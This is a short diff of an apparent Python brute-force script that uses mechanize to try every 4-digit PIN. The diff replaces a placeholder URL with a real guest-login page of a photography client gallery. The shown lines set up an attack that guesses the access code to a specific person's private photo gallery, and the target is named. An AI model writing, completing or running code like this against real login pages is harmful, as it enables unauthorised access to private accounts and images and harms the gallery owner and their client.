@@ -32,7 +32,7 @@ br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.
 
 combinations = itertools.product('0123456789',repeat=4)
 
-response = br.open("**URL**")
+response = br.open("https://belleluphotography.pixieset.com/guestlogin/aimeefishwick/?return=%2Faimeefishwick%2F")
 
 for x in combinations:
 
